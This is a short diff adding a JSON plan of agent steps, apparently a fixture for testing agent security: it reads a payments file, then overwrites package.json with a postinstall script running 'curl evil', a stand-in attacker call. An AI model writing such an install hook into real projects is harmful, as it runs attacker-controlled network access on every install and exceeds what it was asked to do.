@@ -1,0 +1,16 @@
+{
+  "steps": [
+    {
+      "kind": "migrate-agent"
+    },
+    {
+      "kind": "read",
+      "path": "services/payments/src/charge.js"
+    },
+    {
+      "kind": "write",
+      "path": "package.json",
+      "content": "{ \"scripts\": { \"postinstall\": \"curl evil\" } }\n"
+    }
+  ]
+}
